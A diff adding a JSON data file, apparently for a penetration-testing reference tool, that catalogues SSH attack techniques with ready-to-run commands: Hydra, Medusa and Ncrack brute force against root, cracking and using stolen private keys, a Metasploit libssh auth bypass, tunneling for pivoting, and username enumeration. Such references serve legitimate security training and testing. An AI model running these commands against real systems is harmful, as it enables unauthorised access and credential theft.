@@ -1,0 +1,176 @@
+{
+    "name": "SSH - Secure Shell",
+    "port": 22,
+    "description": "Secure encrypted protocol for remote system administration",
+    "icon": "🔐",
+    "techniques": [
+        {
+            "id": "ssh-1",
+            "name": "Password Brute Force",
+            "difficulty": "Beginner",
+            "description": "Crack SSH passwords using automated tools",
+            "steps": [
+                "Identify valid usernames",
+                "Prepare password wordlist",
+                "Configure brute force tool",
+                "Launch attack"
+            ],
+            "commands": [
+                {
+                    "tool": "Hydra",
+                    "command": "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>",
+                    "description": "Brute force root account"
+                },
+                {
+                    "tool": "Hydra (Multiple Users)",
+                    "command": "hydra -L users.txt -P passwords.txt ssh://<target_ip> -t 4",
+                    "description": "Multiple users with 4 threads"
+                },
+                {
+                    "tool": "Medusa",
+                    "command": "medusa -h <target_ip> -u root -P passwords.txt -M ssh",
+                    "description": "Alternative brute force tool"
+                },
+                {
+                    "tool": "Ncrack",
+                    "command": "ncrack -p 22 --user root -P passwords.txt <target_ip>",
+                    "description": "Fast SSH brute forcing"
+                }
+            ],
+            "tips": [
+                "Use -t flag to control threads",
+                "Try common passwords first",
+                "Consider custom wordlists based on target"
+            ]
+        },
+        {
+            "id": "ssh-2",
+            "name": "SSH Key Attacks",
+            "difficulty": "Advanced",
+            "description": "Exploit weak or stolen SSH private keys",
+            "steps": [
+                "Search for exposed private keys",
+                "Test keys against target",
+                "Crack passphrase-protected keys"
+            ],
+            "commands": [
+                {
+                    "tool": "SSH with Key",
+                    "command": "ssh -i stolen_key.pem user@<target_ip>",
+                    "description": "Connect using stolen private key"
+                },
+                {
+                    "tool": "John The Ripper",
+                    "command": "ssh2john id_rsa > hash.txt && john hash.txt --wordlist=rockyou.txt",
+                    "description": "Crack SSH key passphrase"
+                },
+                {
+                    "tool": "Find Keys",
+                    "command": "find / -name 'id_rsa' 2>/dev/null",
+                    "description": "Search for private keys on system"
+                }
+            ],
+            "tips": [
+                "Check .ssh folders, backup directories, git repos",
+                "Keys may be embedded in scripts",
+                "AWS/cloud keys often have no passphrase"
+            ]
+        },
+        {
+            "id": "ssh-3",
+            "name": "Version Exploitation",
+            "difficulty": "Intermediate",
+            "description": "Exploit known vulnerabilities in specific SSH versions",
+            "steps": [
+                "Identify SSH version",
+                "Research known vulnerabilities",
+                "Execute exploit"
+            ],
+            "commands": [
+                {
+                    "tool": "Version Scan",
+                    "command": "nmap -sV -p 22 <target_ip>",
+                    "description": "Identify SSH version"
+                },
+                {
+                    "tool": "Searchsploit",
+                    "command": "searchsploit openssh",
+                    "description": "Search for OpenSSH exploits"
+                },
+                {
+                    "tool": "Metasploit libssh",
+                    "command": "use auxiliary/scanner/ssh/libssh_auth_bypass",
+                    "description": "CVE-2018-10933 libssh bypass"
+                }
+            ],
+            "tips": [
+                "CVE-2018-10933 affects libssh, not OpenSSH",
+                "Keep exploit database updated"
+            ]
+        },
+        {
+            "id": "ssh-4",
+            "name": "SSH Tunneling/Pivoting",
+            "difficulty": "Advanced",
+            "description": "Use SSH access to pivot into internal networks",
+            "steps": [
+                "Gain initial SSH access",
+                "Identify internal network targets",
+                "Set up SSH tunnels"
+            ],
+            "commands": [
+                {
+                    "tool": "Local Port Forward",
+                    "command": "ssh -L 8080:internal_host:80 user@<target_ip>",
+                    "description": "Forward local port to internal service"
+                },
+                {
+                    "tool": "Dynamic SOCKS",
+                    "command": "ssh -D 9050 user@<target_ip>",
+                    "description": "Create SOCKS proxy for pivoting"
+                },
+                {
+                    "tool": "Remote Forward",
+                    "command": "ssh -R 4444:localhost:4444 user@<target_ip>",
+                    "description": "Reverse port forward for callbacks"
+                },
+                {
+                    "tool": "ProxyChains",
+                    "command": "proxychains nmap -sT -Pn <internal_ip>",
+                    "description": "Route tools through SSH tunnel"
+                }
+            ],
+            "tips": [
+                "Use -N flag to prevent shell spawning",
+                "Dynamic forwarding is most flexible"
+            ]
+        },
+        {
+            "id": "ssh-5",
+            "name": "Username Enumeration",
+            "difficulty": "Intermediate",
+            "description": "Identify valid usernames through timing attacks",
+            "steps": [
+                "Prepare list of potential usernames",
+                "Test each username for different responses",
+                "Compile list of valid users"
+            ],
+            "commands": [
+                {
+                    "tool": "Metasploit",
+                    "command": "use auxiliary/scanner/ssh/ssh_enumusers",
+                    "description": "SSH username enumeration module"
+                },
+                {
+                    "tool": "ssh-audit",
+                    "command": "ssh-audit <target_ip>",
+                    "description": "Comprehensive SSH security audit"
+                }
+            ],
+            "tips": [
+                "Works on older OpenSSH versions",
+                "Combine with social engineering for username guessing"
+            ]
+        }
+    ]
+}
